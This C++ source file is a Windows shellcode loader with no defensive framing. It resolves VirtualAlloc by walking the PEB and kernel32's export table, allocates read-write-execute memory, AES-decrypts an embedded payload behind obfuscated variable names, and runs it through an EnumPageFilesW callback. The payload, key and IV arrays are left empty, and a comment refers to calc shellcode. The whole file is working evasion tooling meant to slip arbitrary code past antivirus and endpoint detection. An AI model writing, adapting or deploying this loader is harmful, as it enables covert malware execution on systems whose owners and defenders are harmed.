#include <windows.h>
#include <iostream>
#include <psapi.h>

// alfarom256 calc shellcode
unsigned char ke185hams[] = {};
unsigned char AESiv[] = {};
    
unsigned char itsthecod345[] = {};

    
    
void aesdecrypt(char* data, DWORD dataLen, char* key, DWORD keyLen, char* iv, DWORD ivLen) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv, 0);
    CryptDecrypt(hKey, 0, FALSE, 0, (BYTE*)data, &dataLen);

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

fnVirtualAlloc GetVirtualAlloc() {
#ifdef _M_X64
    PPEB peb = (PPEB)__readgsqword(0x60); // Get PEB on x64
#else
    PPEB peb = (PPEB)__readfsdword(0x30); // Get PEB on x86
#endif

    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY* moduleList = &ldr->InLoadOrderModuleList;
    LIST_ENTRY* entry = moduleList->Flink;

    while (entry != moduleList) {
        PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
        entry = entry->Flink;  // Move to next module

        if (!module->BaseDllName.Buffer) continue;

        // Print module name for debugging
        wprintf(L"Loaded Module: %s\n", module->BaseDllName.Buffer);

        if (_wcsicmp(module->BaseDllName.Buffer, L"KERNEL32.DLL") == 0) {
            BYTE* baseAddress = (BYTE*)module->DllBase;

            IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
            IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

            if (exportDir.VirtualAddress == 0) return nullptr;  // No export table found

            IMAGE_EXPORT_DIRECTORY* exportTable = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + exportDir.VirtualAddress);
            DWORD* nameArray = (DWORD*)(baseAddress + exportTable->AddressOfNames);
            WORD* ordinalArray = (WORD*)(baseAddress + exportTable->AddressOfNameOrdinals);
            DWORD* funcArray = (DWORD*)(baseAddress + exportTable->AddressOfFunctions);

            for (DWORD i = 0; i < exportTable->NumberOfNames; i++) {
                char* functionName = (char*)(baseAddress + nameArray[i]);

                // Print function name for debugging
                std::cout << "Exported Function: " << functionName << std::endl;

                if (strcmp(functionName, "VirtualAlloc") == 0) {
                    DWORD funcRVA = funcArray[ordinalArray[i]];
                    return (fnVirtualAlloc)(baseAddress + funcRVA);
                }
            }
        }
    }
    return nullptr;
}

int main() {
    fnVirtualAlloc VirtualAlloc_Dynamic = GetVirtualAlloc();

    if (VirtualAlloc_Dynamic) {
        std::cout << "VirtualAlloc found at: " << VirtualAlloc_Dynamic << std::endl;

        LPVOID addr = VirtualAlloc_Dynamic(NULL, sizeof(itsthecod345), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (addr) {
            std::cout << "Memory allocated successfully at: " << addr << std::endl;
        } else {
            std::cout << "Failed to allocate memory!" << std::endl;
        }
        aesdecrypt((char*)itsthecod345, sizeof(itsthecod345), (char*)ke185hams, sizeof(ke185hams), (char*)AESiv, sizeof(AESiv));
        RtlMoveMemory(addr, itsthecod345, sizeof(itsthecod345));
        ::EnumPageFilesW((PENUM_PAGE_FILE_CALLBACKW)addr, NULL);
    } else {
        std::cout << "Failed to find VirtualAlloc!" << std::endl;
    }
    
    
}
